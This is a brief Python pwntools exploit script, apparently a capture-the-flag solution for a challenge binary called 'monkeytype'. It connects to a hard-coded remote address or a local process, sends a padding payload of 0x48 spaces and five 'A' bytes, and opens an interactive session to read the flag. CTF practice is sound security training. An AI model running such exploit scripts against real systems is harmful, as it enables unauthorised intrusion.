#!/usr/bin/python3

from pwn import *

exe = ELF('monkeytype', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('34.124.157.94', 12321)
else:
        p = process(exe.path)

GDB()
s(b' '*0x48)
s(b'A'*5)
# output = p.recvall()
# print(output[output.index(b'flag:\n'):])
p.interactive()
